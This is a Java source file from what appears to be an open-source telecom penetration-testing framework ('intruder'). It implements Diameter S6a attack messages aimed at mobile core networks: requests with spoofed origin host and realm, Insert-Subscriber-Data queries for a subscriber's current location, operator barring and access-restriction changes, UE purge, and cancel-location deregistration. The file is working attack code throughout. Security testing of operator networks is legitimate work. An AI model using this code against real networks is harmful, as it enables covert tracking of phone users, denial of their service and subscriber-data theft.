/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.gateway.adapter;

import com.rodan.connectivity.diameter.JDiameterStackAdapter;
import com.rodan.intruder.diameter.entities.payload.DiameterPayload;
import com.rodan.intruder.diameter.entities.payload.s6a.*;
import com.rodan.intruder.diameter.entities.session.DiameterSession;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.util.Util;
import lombok.Builder;
import lombok.ToString;
import net.java.slee.resource.diameter.base.events.avp.AuthSessionStateType;
import net.java.slee.resource.diameter.base.events.avp.DiameterIdentity;
import net.java.slee.resource.diameter.s6a.events.avp.CancellationType;
import net.java.slee.resource.diameter.s6a.events.avp.RATType;
import net.java.slee.resource.diameter.s6a.events.avp.SubscriberStatus;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.jdiameter.api.*;
import org.jdiameter.api.s6a.ClientS6aSession;
import org.jdiameter.api.s6a.ServerS6aSession;
import org.jdiameter.client.impl.SessionImpl;
import org.jdiameter.common.api.app.s6a.IS6aMessageFactory;
import org.mobicents.slee.resource.diameter.s6a.events.*;
import org.mobicents.slee.resource.diameter.s6a.events.avp.RequestedEUTRANAuthenticationInfoAvpImpl;
import org.mobicents.slee.resource.diameter.s6a.events.avp.SubscriptionDataAvpImpl;
import org.mobicents.slee.resource.diameter.s6a.events.avp.SupportedFeaturesAvpImpl;

@ToString(callSuper = true)
public class JDiameterS6aSession extends JDiameterSession<ClientS6aSession, ServerS6aSession, IS6aMessageFactory>
        implements DiameterSession {
    // TODO check if 'implements DiameterSession' is needed
    final static Logger logger = LogManager.getLogger(JDiameterS6aSession.class);


    @Builder
    public JDiameterS6aSession(ApplicationId appId, Session session, ClientS6aSession clientAppSession,
                               ServerS6aSession serverAppSession, IS6aMessageFactory messageFactory) {
        super(appId, session, clientAppSession, serverAppSession, messageFactory);
    }

    @Override
    public void send(DiameterPayload payload) throws SystemException {
        try {
            if (payload instanceof UlrPayload pl) {
                sendUlr(pl);

            } else if (payload instanceof AirPayload pl) {
                sendAir(pl);

            } else if (payload instanceof IdrPayload pl) {
                sendIdr(pl);

            } else if (payload instanceof NorPayload pl) {
                sendNor(pl);

            } else if (payload instanceof PurPayload pl) {
                sendPur(pl);

            } else if (payload instanceof ClrPayload pl) {
                sendClr(pl);

            } else {
                var msg = "Invalid payload provided: " + payload.getClass().getCanonicalName();
                logger.error(msg);
                throw SystemException.builder().code(ErrorCode.MODULE_REQUEST_ERROR).message(msg).build();
            }

        } catch (InternalException| IllegalDiameterStateException | RouteException | OverloadException e) {
            var msg = "Failed to send URL request: " + e.getMessage();
            logger.error(msg, e);
            throw SystemException.builder().code(ErrorCode.MODULE_REQUEST_ERROR).message(msg).parent(e).build();
        }
    }

    private void sendUlr(UlrPayload payload) throws RouteException, IllegalDiameterStateException, OverloadException, InternalException {
        var request = getSession().createRequest(ULR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(), null);
        request.setProxiable(true);
        var ulrRequest = new UpdateLocationRequestImpl(request);
        ulrRequest.setUserName(payload.getImsi());
        ulrRequest.setAuthSessionState(AuthSessionStateType.NO_STATE_MAINTAINED);
        ulrRequest.setRATType(RATType.EUTRAN);
        ulrRequest.setULRFlags(2); // S6a/S6d-Indicator
        var plmnId = Util.generateVisitedPlmnId(Integer.valueOf(payload.getMcc()), Integer.valueOf(payload.getMnc()));
        ulrRequest.setVisitedPLMNId(plmnId);
        var ulr = getMessageFactory().createUpdateLocationRequest(request);
        getClientAppSession().sendUpdateLocationRequest(ulr);
    }

    private void sendAir(AirPayload payload) throws RouteException, IllegalDiameterStateException, OverloadException, InternalException {
        var vendorId3Gpp = JDiameterStackAdapter.VENDOR_ID_3GPP;
        var isMandatory = JDiameterStackAdapter.AVP_MANDATORY_FLAG;
        var isProtected = JDiameterStackAdapter.AVP_NOT_PROTECTED_FLAG;
        var emptyValue = new byte[0];

        Request request;
        if ("Yes".equalsIgnoreCase(payload.getSpoofOrigin())) {
            var session = (SessionImpl) getSession();
            session.setSpoofedHost(payload.getSpoofedHost());
            session.setSpoofedRealm(payload.getSpoofedRealm());
            request = session.createSpoofedRequest(AIR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(), null);
        } else {
            request = getSession().createRequest(AIR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(), null);
        }

        request.setProxiable(true);
        var airRequest = new AuthenticationInformationRequestImpl(request);
        airRequest.setUserName(payload.getImsi());
        airRequest.setAuthSessionState(AuthSessionStateType.NO_STATE_MAINTAINED);

        var requestedInfo = new RequestedEUTRANAuthenticationInfoAvpImpl(1408, vendorId3Gpp, isMandatory, isProtected, emptyValue);
        requestedInfo.setNumberOfRequestedVectors(1L);
        requestedInfo.setImmediateResponsePreferred(1L);
        airRequest.setRequestedEUTRANAuthenticationInfo(requestedInfo);
        var plmnId = Util.generateVisitedPlmnId(Integer.valueOf(payload.getMcc()), Integer.valueOf(payload.getMnc()));
        airRequest.setVisitedPLMNId(plmnId);
        var air = getMessageFactory().createAuthenticationInformationRequest(request);
        getClientAppSession().sendAuthenticationInformationRequest(air);
    }

    private void sendIdr(IdrPayload payload) throws RouteException, IllegalDiameterStateException, OverloadException, InternalException, SystemException {
        var vendorId3Gpp = JDiameterStackAdapter.VENDOR_ID_3GPP;
        var isMandatory = JDiameterStackAdapter.AVP_MANDATORY_FLAG;
        var isProtected = JDiameterStackAdapter.AVP_NOT_PROTECTED_FLAG;
        var emptyValue = new byte[0];

        var request = getSession().createRequest(IDR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(),
                payload.getTargetMmeHost());
        request.setProxiable(true);

        var idrRequest = new InsertSubscriberDataRequestImpl(request);
        idrRequest.setUserName(payload.getImsi());
        idrRequest.setAuthSessionState(AuthSessionStateType.NO_STATE_MAINTAINED);

        var featureList1 = new SupportedFeaturesAvpImpl(IDR_FEATURE_LIST_AVP_CODE, vendorId3Gpp, isMandatory, isProtected, emptyValue);
        featureList1.setVendorId(vendorId3Gpp);
        featureList1.setFeatureListId(IDR_FEATURE_LIST_ID_1_VALUE);
        featureList1.setFeatureList(IDR_FEATURE_LIST_1_VALUE);
        var featureList2 = new SupportedFeaturesAvpImpl(IDR_FEATURE_LIST_AVP_CODE, vendorId3Gpp, isMandatory, isProtected, emptyValue);
        featureList2.setVendorId(vendorId3Gpp);
        featureList2.setFeatureListId(IDR_FEATURE_LIST_ID_2_VALUE);
        featureList2.setFeatureList(IDR_FEATURE_LIST_2_VALUE);
        var supportedFeatures = new SupportedFeaturesAvpImpl[] {featureList1, featureList2};
        idrRequest.setSupportedFeatureses(supportedFeatures);

        var subscriptionData = new SubscriptionDataAvpImpl(1400, vendorId3Gpp, isMandatory, isProtected, emptyValue);

        SubscriberStatus status;
        long idrFlags = 0;

        switch (payload.getUsage()) {
            case LOCATION -> {
                idrFlags = idrFlags | IDR_T_ADS_FLAG | IDR_EPS_USER_STATE_FLAG | IDR_EPS_LOCATION_INFO_REQUEST_FLAG |
                        IDR_CURRENT_LOCATION_REQUEST_FLAG;
                idrRequest.setIDRFlags(idrFlags);
                subscriptionData.setSubscriberStatus(SubscriberStatus.SERVICE_GRANTED);
            }

            case BAR_ODB -> {
                idrFlags = idrFlags | IDR_T_ADS_FLAG | IDR_EPS_USER_STATE_FLAG | IDR_EPS_LOCATION_INFO_REQUEST_FLAG |
                        IDR_CURRENT_LOCATION_REQUEST_FLAG;
                idrRequest.setIDRFlags(idrFlags);
                subscriptionData.setSubscriberStatus(SubscriberStatus.OPERATOR_DETERMINED_BARRING);
                subscriptionData.setOperatorDeterminedBarring(IDR_ODB_SET_FLAG);
            }

            case UNBAR_ODB -> {
                idrFlags = idrFlags | IDR_EPS_USER_STATE_FLAG | IDR_EPS_LOCATION_INFO_REQUEST_FLAG |
                        IDR_CURRENT_LOCATION_REQUEST_FLAG;
                idrRequest.setIDRFlags(idrFlags);
                subscriptionData.setSubscriberStatus(SubscriberStatus.SERVICE_GRANTED);
                subscriptionData.setHPLMNODB(IDR_HPLMN_ODB_CLEAR_FLAG);
                subscriptionData.setOperatorDeterminedBarring(IDR_ODB_CLEAR_FLAG);
            }

            case BAR_ACCESS_RESTRICTION -> {
                subscriptionData.setSubscriberStatus(SubscriberStatus.SERVICE_GRANTED);
                subscriptionData.setAccessRestrictionData(IDR_ACCESS_RESTRICTION_SET_FLAG);
            }

            case UNBAR_ACCESS_RESTRICTION -> {
                subscriptionData.setSubscriberStatus(SubscriberStatus.SERVICE_GRANTED);
                subscriptionData.setAccessRestrictionData(IDR_ACCESS_RESTRICTION_CLEAR_FLAG);
            }

            default -> {
                var msg = "Unsupported IDR usage";
                logger.error(msg);
                throw SystemException.builder().code(ErrorCode.MAP_DIALOG_SEND_FAILED).message(msg).build();
            }
        }


        idrRequest.setSubscriptionData(subscriptionData);

        var idr = getMessageFactory().createInsertSubscriberDataRequest(request);
        getServerAppSession().sendInsertSubscriberDataRequest(idr);
    }

    private void sendNor(NorPayload payload) throws RouteException, IllegalDiameterStateException, OverloadException, InternalException, SystemException {
        Request request;
        if ("Yes".equalsIgnoreCase(payload.getSpoofOrigin())) {
            // TODO Diameter IMP: For spoofed requests, Session-Id should match spoofed origin
            var session = (SessionImpl) getSession();
            session.setSpoofedHost(payload.getSpoofedHost());
            session.setSpoofedRealm(payload.getSpoofedRealm());
            request = session.createSpoofedRequest(NOR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(), null);
        } else {
            request = getSession().createRequest(NOR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(), null);
        }

        request.setProxiable(true);
        var norRequest = new NotifyRequestImpl(request);
        norRequest.setUserName(payload.getImsi());
        norRequest.setAuthSessionState(AuthSessionStateType.NO_STATE_MAINTAINED);
        norRequest.setNORFlags(512L); // Removal of MME registration for SMS
        var nor = getMessageFactory().createNotifyRequest(request);
        getClientAppSession().sendNotifyRequest(nor);
    }

    private void sendPur(PurPayload payload) throws RouteException, IllegalDiameterStateException, OverloadException, InternalException, SystemException {
        var request = getSession().createRequest(PUR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(), null);
        request.setProxiable(true);
        var purRequest = new PurgeUERequestImpl(request);
        purRequest.setUserName(payload.getImsi());
        purRequest.setAuthSessionState(AuthSessionStateType.NO_STATE_MAINTAINED);
        purRequest.setPURFlags(3L); // Purge UE in MME and SGSN
        var pur = getMessageFactory().createPurgeUERequest(request);
        getClientAppSession().sendPurgeUERequest(pur);
    }

    private void sendClr(ClrPayload payload) throws RouteException, IllegalDiameterStateException, OverloadException, InternalException {
        var request = getSession().createRequest(CLR_COMMAND_CODE, getAppId(), payload.getDestinationRealm(),
                payload.getTargetMmeHost());
        request.setProxiable(true);
        var clrRequest = new CancelLocationRequestImpl(request);
        clrRequest.setUserName(payload.getImsi());
        clrRequest.setAuthSessionState(AuthSessionStateType.NO_STATE_MAINTAINED);
        clrRequest.setCancellationType(CancellationType.SUBSCRIPTION_WITHDRAWAL);
        clrRequest.setCLRFlags(1L); // Reattach-Required not set, S6a/S6d-Indicator set
        var clr = getMessageFactory().createCancelLocationRequest(request);
        getServerAppSession().sendCancelLocationRequest(clr);
    }
}
